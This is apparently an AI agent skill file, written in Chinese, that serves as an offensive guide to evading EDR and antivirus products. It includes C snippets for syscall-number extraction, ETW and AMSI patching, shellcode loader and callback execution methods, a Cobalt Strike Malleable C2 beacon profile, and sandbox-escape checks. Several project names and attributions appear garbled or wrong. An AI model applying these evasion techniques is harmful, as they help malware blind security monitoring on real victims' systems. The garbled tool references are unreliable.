---
name: edr-av-bypass
description: EDR/AV 绕过与免杀技术。API unhook、direct/indirect syscall、ETW/AMSI patch、call stack spoofing、CrowdStrike/Defender/SentinelOne 绕过。
author: 7452323
tags:
  - edr-bypass
  - av-bypass
  - anti-av
  - anti-edr
  - syscall
  - unhook
  - shellcode
  - cobalt-strike
---

# EDR / AV 绕过 (免杀)

## 核心概念

### 防御产品矩阵

| 类型 | 产品 | 核心能力 |
|------|------|---------|
| EDR | CrowdStrike Falcon, SentinelOne, Elastic Defend, Microsoft Defender for Endpoint | 行为监控, 威胁狩猎 |
| AV | Windows Defender, Kaspersky, Bitdefender | 签名+启发式 |
| XDR | CrowdStrike Falcon XDR, SentinelOne Singularity | 扩展检测 |
| SIEM | Splunk, Elastic SIEM | 日志聚合分析 |

### 杀软检测技术

| 技术 | 原理 | 对抗方法 |
|------|------|---------|
| 签名检测 | 文件哈希/字节序列匹配 | 多态/变形 |
| 启发式分析 | 可疑 API 调用组合 | 间接调用 |
| 行为监控 | 进程/文件/注册表监控 | 父进程欺骗 |
| 内存扫描 | 内存特征扫描 | 加密 payload |
| AMSI | 脚本内容扫描 | AMSI patch |
| ETW | 事件追踪 | ETW patch |
| 硬件断点 | 调用栈检查 | 移除/绕过 |

## Direct / Indirect Syscall

### 原理

避免在 ntdll.dll 中留下调用痕迹，直接从用户态进入内核。

### 调用链对比

```
Direct Syscall:
  用户代码 → sysenter/syscall → 内核 (无 ntdll 痕迹)

Indirect Syscall (模块踩踏):
  用户代码 → 借用 ntdll 的 gadget → syscall → 内核
  (调用栈看起来像合法调用)
```

### 主流实现

| 项目 | Stars | 特点 |
|------|-------|------|
| **jbyt1/HellsGate** | — | 先驱，自动提取 syscall number |
| **am0nse/Halo's Gate** | — | Hell's Gate 增强版 |
| **S4ntiagoP/TartarusGate** | — | 添加调用栈欺骗 |
| **JustasMasiulis/whisper_walk** | — | Syscall 地址泄露 (Turbo) |
| **kyle41/swishadow** | — | 动态获取 syscall |
| **Cobalt-Strike/usercall_generator** | — | 为 Cobalt Strike 生成 |
| **SecuraBV/Tesla-M-Binder** | — | 绑定合法调用栈 |

### Hell's Gate 核心逻辑

```c
// 从 ntdll 提取 SSN (System Service Number)
for (DWORD i = 0; i < 0x1000; i++) {
    // 寻找 mov r10, rcx; mov eax, SSN 模式
    if (ntdll_bytes[i] == 0x4C && ntdll_bytes[i+1] == 0x8B &&
        ntdll_bytes[i+2] == 0xD1 && ntdll_bytes[i+3] == 0xB8) {
        SSN = *(DWORD*)(ntdll_bytes + i + 4);
    }
}
```

## NTDLL Unhook

### 原理

EDR 在 ntdll.dll 的 Nt* 函数头写入 jmp 到其监控引擎。Unhook = 恢复原始 ntdll。

### 方法

| 方法 | 实现 |
|------|------|
| **从磁盘读取** | 读取 ntdll.dll 原始文件，覆盖 .text 段 |
| **从已知 DLL** | 使用 KnownDlls 中的 ntdll |
| **从调试版** | 使用 ntdll.dll 的调试版本 |
| **手动映射** | 手动加载 ntdll，重建 IAT |
| **Suspend + Resume** | 挂起进程，恢复后 Resume |

### 工具

| 工具 | 特点 |
|------|------|
| **perunsFNTDLLOPENFILE** | 使用 NtOpenFile 读取 |
| **RiseProtector** | 综合 unhook |
| **NTDLL-Unhooking** | 多种方法 |

## ETW Patching

### 原理

ETW (Event Tracing for Windows) 是 EDR 的主要数据源。Patch = 阻止事件上报。

### 目标函数

| 函数 | 作用 |
|------|------|
| **EtwEventWrite** | 阻止事件写入 |
| **EtwEventWriteFull** | 阻止完整事件 |
| **NtTraceEvent** | 阻止底层追踪 |

### 实现

```c
// 将函数头 patch 为 ret
VirtualProtect(EtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)EtwEventWrite = 0xC3;  // ret
```

## AMSI Patching

### 原理

AMSI (Antimalware Scan Interface) 是 Windows 的脚本内容扫描接口。

### 目标函数

| 函数 | 位置 |
|------|------|
| **AmsiScanBuffer** | amsi.dll |
| **AmsiScanString** | amsi.dll |

### Patch 方式

```c
// 将 AmsiScanBuffer patch 为返回 S_OK
// 经典 6 字节 patch
 mov rax, S_OK
 ret
```

### 多种 Patch 方法

| 方法 | 特点 |
|------|------|
| **内存 patch** | 直接修改函数头 |
| **Hardware BP** | 硬件断点 hook |
| **Software BP** | INT3 断点 hook |
| **Dual-Use** | 条件 patch |

## Call Stack Spoofing

### 原理

伪造调用栈，使返回地址看起来来自合法模块。

### 技术

| 技术 | 说明 |
|------|------|
| **Stack Pivot** | 切换到伪造的栈帧 |
| **Custom CreateThread** | 使用合法函数作为 Target|
| **Call Stack Tampering** | 修改已存在的栈帧 |
| **Gadget 链** | 使用 ROP gadget 构造合法栈 |

### 工具

| 工具 | 特点 |
|------|------|
| **SilentMoonwalk** | 基于 Syscall 的栈欺骗 |
| **Teleport** | ROP-based |
| **StackTrace-Spoofer-Rban** | 通用实现 |

## Shellcode 加载器

### 分类

| 类型 | 检测难度 | 说明 |
|------|---------|------|
| 直接 VirtualAlloc + CreateThread | ⭐ 易检测 | 最基础 |
| 进程注入 (Process Injection) | ⭐⭐ | 注入到其他进程 |
| 进程镂空 (Process Hollowing) | ⭐⭐⭐ | 替换合法进程内存 |
| 进程 Herpaderping | ⭐⭐⭐⭐ | 修改磁盘文件 |
| DLL 劫持 | ⭐⭐⭐⭐ | 劫持加载链 |
| 模块踩踏 (Module Stomping) | ⭐⭐⭐⭐ | 覆盖合法模块 |
| 回调执行 | ⭐⭐⭐⭐⭐ | 使用合法回调 |
| 动态Invoke | ⭐⭐⭐⭐⭐ | 避免直接 API 调用 |

### 执行方式

| 方式 | 原理 | 隐蔽性 |
|------|------|--------|
| CreateThread | 直接创建线程 | 低 |
| EnumSystemGeoID | 回调函数执行 | 高 |
| FlsCallback | 纤程回调 | 高 |
| Interrupt Hook | 中断钩子 | 高 |
| ImageGetDigestStream | 映像回调 | 高 |
| NtCreateSection + MapViewOfSection | 内存映射 | 高 |

### 免杀加载器项目

| 项目 | Stars | 特点 |
|------|-------|------|
| **mdsecactivebreach/SharpPack** | — | 内嵌加密 |
| **kkent030315/Waffle** | — | 模块踩踏 |
| **boku7/BokuLoader** | — | HWBP + XOR |
| **SecuraBV/Janus** | — | 回调执行 |
| **Cobalt-Strike/ParallelAsync** | — | 异步回调 |

## C2 框架与免杀

### 主流 C2

| C2 | 特点 | 平台 |
|----|------|------|
| **Cobalt Strike** | 商业，Malleable C2 | Windows |
| **Sliver** | 开源，Go 编写 | 跨平台 |
| **Havoc** | 开源，现代 UI | Windows/Mac |
| **Mythic** | 开源，模块化 | 跨平台 |
| **Brute Ratel** | 商业，HWBP | Windows |

### Malleable C2 Profile

```xml
http-get {
    uri = "/wp-admin";
    client {
        header "Host" "cdn.example.com";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
}
```

## 免杀检查清单

```
□ 静态扫描 (VirusTotal)
□ 字符串分析 (无明文 C2)
□ 熵值检查 (避免高熵区)
□ 导入表分析 (避免可疑 API)
□ 动态分析 (沙箱)
□ AMSI 触发测试
□ ETW 触发测试
□ 调用栈检查
□ 内存特征扫描
□ 行为监控 (ProcMon)
```

## 沙箱 / 分析环境逃逸

| 检测项 | 对抗方法 |
|--------|---------|
| CPU 核心数 | 检测 < 4 核则退出 |
| 内存大小 | 检测 < 4GB 则退出 |
| 磁盘大小 | 检测 < 100GB 则退出 |
| 用户名 | 检测沙箱默认名 |
| 进程名 | 检测分析工具进程 |
| MAC 地址 | 检测虚拟机厂商 |
| 显卡 | 检测无显卡 |
| 用户交互 | 等待点击/滚动 |
| 时间加速 | rdtsc 检测时间差 |
| 最近文件 | 检测无文档/下载 |
